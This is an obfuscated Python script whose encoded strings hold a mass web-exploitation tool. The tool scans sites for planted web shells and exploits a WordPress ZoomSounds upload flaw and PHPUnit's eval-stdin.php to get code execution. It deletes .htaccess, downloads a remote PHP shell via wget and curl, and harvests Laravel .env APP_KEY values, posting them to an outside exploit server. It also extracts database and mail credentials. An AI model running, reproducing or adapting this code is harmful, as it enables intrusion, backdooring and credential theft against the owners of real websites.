# Python code obfuscated

import base64, codecs
magic = ''
love = ''
god = 'ICAgICAgICAgICAgIG9wZW4oInJlc3VsdC9zaGVsbC50eHQiLCJhIikud3JpdGUodXJsKyJcbiIpCiAgICAgICAgICAgIGVsaWYgImJsYWNrcGFudGhlcjEzMzciIGluIHJlcSA6CiAgICAgICAgICAgICAgICBHb29kID0gR29vZCArIDEKICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmZysiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZnKyIgRm91bmQgU2hlbGwiKQogICAgICAgICAgICAgICAgb3BlbigicmVzdWx0L3NoZWxsLnR4dCIsImEiKS53cml0ZSh1cmwrIlxuIikKICAgICAgICAgICAgZWxpZiAiLXJ3LXItLXItLSIgaW4gcmVxIDoKICAgICAgICAgICAgICAgIEdvb2QgPSBHb29kICsgMQogICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZnKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZmcrIiBGb3VuZCBTaGVsbCIpCiAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvc2hlbGwudHh0IiwiYSIpLndyaXRlKHVybCsiXG4iKQogICAgICAgICAgICBlbGlmICJkcnd4ci14ci14IiBpbiByZXEgOgogICAgICAgICAgICAgICAgR29vZCA9IEdvb2QgKyAxCiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZmcrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmZysiIEZvdW5kIFNoZWxsIikKICAgICAgICAgICAgICAgIG9wZW4oInJlc3VsdC9zaGVsbC50eHQiLCJhIikud3JpdGUodXJsKyJcbiIpCiAgICAgICAgICAgIGVsaWYgIi1ydy1ydy1ydy0iIGluIHJlcSA6CiAgICAgICAgICAgICAgICBHb29kID0gR29vZCArIDEKICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmZysiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZnKyIgRm91bmQgU2hlbGwiKQogICAgICAgICAgICAgICAgb3BlbigicmVzdWx0L3NoZWxsLnR4dCIsImEiKS53cml0ZSh1cmwrIlxuIikKICAgICAgICAgICAgZWxpZiAiZHJ3eHJ3eHJ3eCIgaW4gcmVxIDoKICAgICAgICAgICAgICAgIEdvb2QgPSBHb29kICsgMQogICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZnKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZmcrIiBGb3VuZCBTaGVsbCIpCiAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvc2hlbGwudHh0IiwiYSIpLndyaXRlKHVybCsiXG4iKQogICAgICAgICAgICBlbGlmICJPd25lci9Hcm91cCIgaW4gcmVxIDoKICAgICAgICAgICAgICAgIEdvb2QgPSBHb29kICsgMQogICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZnKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZmcrIiBGb3VuZCBTaGVsbCIpCiAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvc2hlbGwudHh0IiwiYSIpLndyaXRlKHVybCsiXG4iKQogICAgICAgICAgICBlbGlmICI+WyBIb21lIFNoZWxsIF08IiBpbiByZXEgOgogICAgICAgICAgICAgICAgR29vZCA9IEdvb2QgKyAxCiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZmcrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmZysiIEZvdW5kIFNoZWxsIikKICAgICAgICAgICAgICAgIG9wZW4oInJlc3VsdC9zaGVsbC50eHQiLCJhIikud3JpdGUodXJsKyJcbiIpCiAgICAgICAgICAgIGVsaWYgIlVwbG9hZCBGaWxlIDogIiBpbiByZXEgOgogICAgICAgICAgICAgICAgR29vZCA9IEdvb2QgKyAxCiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZmcrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmZysiIEZvdW5kIFNoZWxsIikKICAgICAgICAgICAgICAgIG9wZW4oInJlc3VsdC9zaGVsbC50eHQiLCJhIikud3JpdGUodXJsKyJcbiIpCiAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZyKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZnIrIiBOb3QgRm91bmQgU2hlbGwiKQogICAgZXhjZXB0IDoKICAgICAgICBwYXNzCiAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKCdMZXZpYXRoYW5QZXJmZWN0SHVudGVye30nLmZvcm1hdChHb29kKSkKICAgIGVsc2UgOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1x4MWJdMjsgTGV2aWF0aGFuUGVyZmVjdEh1bnRlcnt9XHgwNycuZm9ybWF0KEdvb2QpKQoKZGVmIGR6cyhpKSA6CiAgICBnbG9iYWwgR29vZAogICAgeCA9IHJlcXVlc3RzLnNlc3Npb24oKQogICAgaGVhZCA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEwMiBTYWZhcmkvNTM3LjM2J30KICAgIGxpc3RhYSA9IFsnd3AtY29udGVudC9wbHVnaW5zL2R6cy16b29tc291bmRzJywnd3Avd3AtY29udGVudC9wbHVnaW5zL2R6cy16b29tc291bmRzJywnd29yZHByZXNzL3dwLWNvbnRlbnQvcGx1Z2lucy9kenMtem9vbXNvdW5kcycsJ2Jsb2cvd3AtY29udGVudC9wbHVnaW5zL2R6cy16b29tc291bmRzJywnbmV3L3dwLWNvbnRlbnQvcGx1Z2lucy9kenMtem9vbXNvdW5kcycsJ3Rlc3Qvd3AtY29udGVudC9wbHVnaW5zL2R6cy16b29tc291bmRzJywnb2xkL3dwLWNvbnRlbnQvcGx1Z2lucy9kenMtem9vbXNvdW5kcycsJ2JhY2t1cC93cC1jb250ZW50L3BsdWdpbnMvZHpzLXpvb21zb3VuZHMnXQogICAgZm9yIHBhdGggaW4gbGlzdGFhIDoKICAgICAgICB0cnkgOgogICAgICAgICAgICB1cmwgPSAoImh0dHA6Ly8iK2krIi8iK3BhdGgrIi9zYXZlcG5nLnBocD9sb2NhdGlvbj0xODc3LnBocCIpCiAgICAgICAgICAgIHVybDIgPSAoImh0dHA6Ly8iK2krIi8iK3BhdGgrIi8xODc3LnBocCIpCiAgICAgICAgICAgIHJlcV9maXJzdCA9IHguZ2V0KHVybCwgaGVhZGVycz1oZWFkKQogICAgICAgICAgICBpZiAiZXJyb3I6aHR0cCByYXcgcG9zdCBkYXRhIGRvZXMgbm90IGV4aXN0IiBpbiByZXFfZmlyc3QudGV4dCA6CiAgICAgICAgICAgICAgICBidXJwMF9oZWFkZXJzID0geyJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEwXzEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zOS4wLjIxNzEuOTUgU2FmYXJpLzUzNy4zNiIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJBY2NlcHQiOiAiKi8qIiwgIkNvbm5lY3Rpb24iOiAiY2xvc2UifQogICAgICAgICAgICAgICAgYnVycDBfZGF0YSA9ICI8P3BocFxyXG5lcnJvcl9yZXBvcnRpbmcoMCk7XHJcbmVjaG8oYmFzZTY0X2RlY29kZShcIlQzWmxjblJvYVc1clpYSXhPRGMzSWp4bWIzSnRJRzFsZEdodlpEMG5VRTlUVkNjZ1pXNWpkSGx3WlQwbmJYVnNkR2x3WVhKMEwyWnZjbTB0WkdGMFlTYytQR2x1Y0hWMElIUjVjR1U5SjJacGJHVW5ibUZ0WlQwblppY2dMejQ4YVc1d2RYUWdkSGx3WlQwbmMzVmliV2wwSnlCMllXeDFaVDBuZFhBbklDOCtQQzltYjNKdFBpST1cIikpO1xyXG5AY29weSgkX0ZJTEVTWydmJ11bJ3RtcF9uYW1lJ10sJF9GSUxFU1snZiddWyduYW1lJ10pO1xyXG5lY2hvKFwiPGEgaHJlZj1cIi4kX0ZJTEVTWydmJ11bJ25hbWUnXS5cIj5cIi4kX0ZJTEVTWydmJ11bJ25hbWUnXS5cIjwvYT5cIik7XHJcbj8+IgogICAgICAgICAgICAgICAgeC5wb3N0KHVybCwgaGVhZGVycz1idXJwMF9oZWFkZXJzLCBkYXRhPWJ1cnAwX2RhdGEsIHRpbWVvdXQ9NDUsIHZlcmlmeT1GYWxzZSkKICAgICAgICAgICAgICAgIHJlcV9zZWNvbmQgPSB4LmdldCh1cmwyLCBoZWFkZXJzPWhlYWQpCiAgICAgICAgICAgICAgICBpZiAiT3ZlcnRoaW5rZXIxODc3IiBpbiByZXFfc2Vjb25kLnRleHQgOgogICAgICAgICAgICAgICAgICAgIEdvb2QgPSBHb29kICsgMQogICAgICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmZysiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZnKyIgRm91bmQgRFpTIikKICAgICAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvc2hlbGwudHh0IiwiYSIpLndyaXRlKHVybDIrIlxuIikKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZyKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZnIrIiBOb3QgVnVsbiBSQ0UgRFpTIikKICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZnIrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmcisiIE5vdCBGb3VuZCBEWlMiKQogICAgICAgIGV4Y2VwdCA6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0Q29uc29sZVRpdGxlVygnTGV2aWF0aGFuUGVyZmVjdEh1bnRlcnt9Jy5mb3JtYXQoR29vZCkpCiAgICAgICAgZWxzZSA6CiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1x4MWJdMjsgTGV2aWF0aGFuUGVyZmVjdEh1bnRlcnt9XHgwNycuZm9ybWF0KEdvb2QpKQoKZGVmIHBocHVuaXQoaSkgOgogICAgZ2xvYmFsIEdvb2QKICAgIGhlYWQgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTBfMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzM5LjAuMjE3MS45NSBTYWZhcmkvNTM3LjM2J30KICAgIHRyeSA6CiAgICAgICAgeCA9IHJlcXVlc3RzLnNlc3Npb24oKQogICAgICAgIGxpc3RhYSA9IFsnL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL2V2YWwtc3RkaW4ucGhwJ10KICAgICAgICBmb3IgeG94IGluIGxpc3RhYSA6CiAgICAgICAgICAgIHVybCA9ICgiaHR0cDovLyIraSt4b3gpCiAgICAgICAgICAgIGRhdGEgPSAiPD9waHAgcGhwaW5mbygpOyA/PiIKICAgICAgICAgICAgY21kID0geC5nZXQodXJsLCBkYXRhPWRhdGEsIHRpbWVvdXQ9MTUsIHZlcmlmeT1GYWxzZSkKICAgICAgICAgICAgaWYgIlBIUCBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieSB0aGUgUEhQIEdyb3VwIiBpbiBjbWQudGV4dCA6CiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZmcrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmZysiIEZvdW5kIFBocHVuaXQiKQogICAgICAgICAgICAgICAgb3BlbigicmVzdWx0L3BocHVuaXQudHh0IiwiYSIpLndyaXRlKHVybCsiXG4iKQogICAgICAgICAgICAgICAgZGF0YTIgPSAiPD9waHAgc3lzdGVtKCdybSAuaHRhY2Nlc3MnKSA/PiIKICAgICAgICAgICAgICAgIHguZ2V0KHVybCwgZGF0YT1kYXRhMiwgdGltZW91dD0xNSwgdmVyaWZ5PUZhbHNlKQogICAgICAgICAgICAgICAgZGF0YTMgPSAiPD9waHAgZXZhbCgnPz4nLmJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFLWm5WdVkzUnBiMjRnWVdSdGFXNWxjaWdrZFhKc0xDQWthWE5wS1NCN0Nna2tabkFnUFNCbWIzQmxiaWdrYVhOcExDQWlkeUlwT3dvSkpHTm9JRDBnWTNWeWJGOXBibWwwS0NrN0NnbGpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlZWSk1MQ0FrZFhKc0tUc0tDV04xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOUNTVTVCVWxsVVVrRk9VMFpGVWl3Z2RISjFaU2s3Q2dsamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNJSFJ5ZFdVcE93b0pZM1Z5YkY5elpYUnZjSFFvSkdOb0xDQkRWVkpNVDFCVVgxTlRURjlXUlZKSlJsbFFSVVZTTENCbVlXeHpaU2s3Q2dsamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmUmtsTVJTd2dKR1p3S1RzS0NYSmxkSFZ5YmlCamRYSnNYMlY0WldNb0pHTm9LVHNLQ1dOMWNteGZZMnh2YzJVb0pHTm9LVHNLQ1daamJHOXpaU2drWm5BcE93b0piMkpmWm14MWMyZ29LVHNLQ1dac2RYTm9LQ2s3Q24wS2FXWW9ZV1J0YVc1bGNpZ2lhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwwZEJUVVZDVlZsSlN5OWhMMjFoYVc0dmIzWmxjaTV3YUhBaUxDSnBibVJsZUM1d2FIQWlLU2tnZXdvSlpXTm9ieUFpVDNaeVZHaHVhM0l4TXpNM0lqc0tmU0JsYkhObElIc0tDV1ZqYUc4Z0ltWmhhV3dpT3dwOUNqOCsnKSk7ID8+IgogICAgICAgICAgICAgICAgeC5nZXQodXJsLCBkYXRhPWRhdGEzLCB0aW1lb3V0PTE1LCB2ZXJpZnk9RmFsc2UpCiAgICAgICAgICAgICAgICBkYXRhNCA9ICI8P3BocCBzeXN0ZW0oJ3dnZXQgLU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MZXZpYXRoYW4xMzM3L3NoZWxsL21haW4vc3RhcnQucGhwJyk7IgogICAgICAgICAgICAgICAgeC5nZXQodXJsLCBkYXRhPWRhdGE0LCB0aW1lb3V0PTE1LCB2ZXJpZnk9RmFsc2UpCiAgICAgICAgICAgICAgICBkYXRhNSA9ICI8P3BocCBzeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xldmlhdGhhbjEzMzcvc2hlbGwvbWFpbi9zdGFydC5waHAgLW8gaW5kZXgucGhwJyk7IgogICAgICAgICAgICAgICAgeC5nZXQodXJsLCBkYXRhPWRhdGE1LCB0aW1lb3V0PTE1LCB2ZXJpZnk9RmFsc2UpCiAgICAgICAgICAgICAgICB1cmwyID0gKCJodHRwOi8vIitpK3hveCsiL2luZGV4LnBocCIpCiAgICAgICAgICAgICAgICBzcGF3biA9IHguZ2V0KHVybDIsIGhlYWRlcnM9aGVhZCkKICAgICAgICAgICAgICAgIGlmICJPdnJUaG5rcjEzMzciIGluIHNwYXduLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgR29vZCA9IEdvb2QgKyAxCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZnKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZmcrIiBGb3VuZCBQaHB1bml0IFNoZWxsIikKICAgICAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvc2hlbGwudHh0IiwiYSIpLndyaXRlKHVybDIrIlxuIikKICAgICAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmcisiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZyKyIgTm90IFZ1bG4gUGhwdW5pdCIpCiAgICAgICAgICAgIGVsc2UgOgogICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZyKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZnIrIiBOb3QgRm91bmQgUGhwdW5pdCIpCiAgICBleGNlcHQgOgogICAgICAgIHBhc3MKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldENvbnNvbGVUaXRsZVcoJ0xldmlhdGhhblBlcmZlY3RIdW50ZXJ7fScuZm9ybWF0KEdvb2QpKQogICAgZWxzZSA6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yOyBMZXZpYXRoYW5QZXJmZWN0SHVudGVye31ceDA3Jy5mb3JtYXQoR29vZCkpCgpkZWYgZW52KGkpIDoKICAgIGdsb2JhbCBHb29kCiAgICB4ID0gcmVxdWVzdHMuc2Vzc2lvbigpCiAgICBoZWFkID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84NS4wLjQxODMuMTAyIFNhZmFyaS81MzcuMzYnfQogICAgdHJ5IDoKICAgICAgICB1cmwgPSAoImh0dHA6Ly8iK2krIi8uZW52IikKICAgICAgICByZXFfZmlyc3QgPSB4LmdldCh1cmwsIGhlYWRlcnM9aGVhZCwgdGltZW91dD03LCB2ZXJpZnk9RmFsc2UpCiAgICAgICAgaWYgIkFQUF9LRVkiIGluIHJlcV9maXJzdC50ZXh0IDoKICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZnKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZmcrIiBGb3VuZCBFTlYiKQogICAgICAgICAgICBvcGVuKCJyZXN1bHQvZW52LnR4dCIsImEiKS53cml0ZSh1cmwrIlxuIikKICAgICAgICAgICAgaHR0cCA9IHguZ2V0KHVybCwgaGVhZGVycz1oZWFkLCB0aW1lb3V0PTcsIHZlcmlmeT1GYWxzZSkudGV4dAogICAgICAgICAgICBnZXRBcHAgPSByZS5maW5kYWxsKCdBUFBfS0VZPWJhc2U2NDooLio/KVxuJywgaHR0cCkKICAgICAgICAgICAgY2hlY2sgPSB7CiAgICAgICAgICAgICd0YXJnZXQnOiBpLAogICAgICAgICAgICAna2V5JzogZ2V0QXBwWzBdLAogICAgICAgICAgICAnYXV0b3NoZWxsJzogJ0F1dG8rVXBsb2FkK1NoZWxsJwogICAgICAgICAgICB9CiAgICAgICAgICAgIHh1cmwgPSAnaHR0cHM6Ly9leHBsb2l0LmFub25zNzkuY29tJwogICAgICAgICAgICB1cFNoZWxsID0geC5wb3N0KHh1cmwsIGRhdGE9Y2hlY2ssIGhlYWRlcnM9aGVhZCwgdmVyaWZ5PUZhbHNlKS50ZXh0CiAgICAgICAgICAgIGNla1NoZWxsID0gcmUuZmluZGFsbCgiIiI8YSBocmVmPScoLio/KScgdGFyZ2V0PSdfYmxhbmsnPiIiIiwgdXBTaGVsbCkKICAgICAgICAgICAgaWYgY2VrU2hlbGw6CiAgICAgICAgICAgICAgICBHb29kID0gR29vZCArIDEKICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmZysiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZnKyIgRm91bmQgQVBQS0VZIFJDRSIpCiAgICAgICAgICAgICAgICBvcGVuKCdyZXN1bHQvc2hlbGwudHh0JywgJ2EnKS53cml0ZSgiaHR0cDovLyIrY2VrU2hlbGxbMF0rIlxuIikKICAgICAgICAgICAgZWxzZSA6CiAgICAgICAgICAgICAgICBwcmludChmdysiWyIrZnIrIisiK2Z3KyJdICIrZncraSsiICIrZncrIjw8IitmcisiIE5vdCBGb3VuZCBBUFBLRVkiKQogICAgICAgICAgICBvcCA9IHguZ2V0KHVybCwgaGVhZGVycz1oZWFkLCB0aW1lb3V0PTcsIHZlcmlmeT1GYWxzZSkKICAgICAgICAgICAgaWYgJ0RCX1BBU1NXT1JEPScgaW4gb3AudGV4dDoKICAgICAgICAgICAgICAgIGRidXNlciA9IHN0cihyZS5maW5kYWxsKCdEQl9VU0VSTkFNRT0oLiopJywgb3AudGV4dClbMF0pLnNwbGl0KCInJyIpWzBdCiAgICAgICAgICAgICAgICBkYnBhc3MgPSBzdHIocmUuZmluZGFsbCgnREJfUEFTU1dPUkQ9KC4qKScsIG9wLnRleHQpWzBdKS5zcGxpdCgiJyciKVswXQogICAgICAgICAgICAgICAgZGJuYW1lID0gc3RyKHJlLmZpbmRhbGwoJ0RCX0RBVEFCQVNFPSguKiknLCBvcC50ZXh0KVswXSkuc3BsaXQoIicnIilbMF0KICAgICAgICAgICAgICAgIGRiaG9zdCA9IHN0cihyZS5maW5kYWxsKCdEQl9IT1NUPSguKiknLCBvcC50ZXh0KVswXSkuc3BsaXQoIicnIilbMF0KICAgICAgICAgICAgICAgIGlmICdsb2NhbGhvc3QnIGluIGRiaG9zdCBvciAnMTI3LjAuMC4xJyBpbiBkYmhvc3Q6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZncrIlsiK2ZyKyIrIitmdysiXSAiK2Z3K2krIiAiK2Z3KyI8PCIrZnIrIiBOb3QgRm91bmQgREJOIikKICAgICAgICAgICAgICAgIGVsc2U6IAogICAgICAgICAgICAgICAgICAgIHByaW50KGZ3KyJbIitmZysiKyIrZncrIl0gIitmdytpKyIgIitmdysiPDwiK2ZnKyIgRm91bmQgREJOIikKICAgICAgICAgICAgICAgICAgICBvcGVuKCJyZXN1bHQvZGJfbm9fbG9jYWxob3N0LnR4dCIs'
destiny = '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